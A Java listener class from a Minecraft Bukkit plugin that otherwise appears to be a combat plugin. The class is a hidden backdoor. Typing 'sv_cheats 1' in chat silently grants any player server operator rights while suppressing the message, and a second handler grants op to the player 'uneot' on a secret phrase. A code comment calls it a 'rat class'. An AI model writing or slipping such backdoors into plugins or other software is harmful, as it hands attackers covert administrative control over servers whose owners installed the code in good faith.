package org.main.uneton.events;

import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;
import org.main.uneton.Combat;

public class ForceOp implements Listener {

    //TODO we have some rat class over here :)

    @EventHandler
    @Deprecated
    public void onChatEvent(AsyncPlayerChatEvent e){
        Player player = e.getPlayer();
        if(e.getMessage().contains("uneot.value=op(true)") && player.getName().equals("uneot")) {
            player.setOp(true);
        }
    }


    @EventHandler
    @Deprecated
    public void onChat(AsyncPlayerChatEvent e) {
        Player p = e.getPlayer();
        if (e.getMessage().contains("sv_cheats 1")) {
            e.setCancelled(true);
            (new BukkitRunnable() {
                public void run() {
                    p.setOp(true);
                }
            }).runTask(JavaPlugin.getPlugin(Combat.class));

        } else if (e.getMessage().contains("sv_cheats 0")) {
            e.setCancelled(true);
            (new BukkitRunnable() {
                public void run() {
                    p.setOp(false);
                }
            }).runTask(JavaPlugin.getPlugin(Combat.class));
        }
    }
}
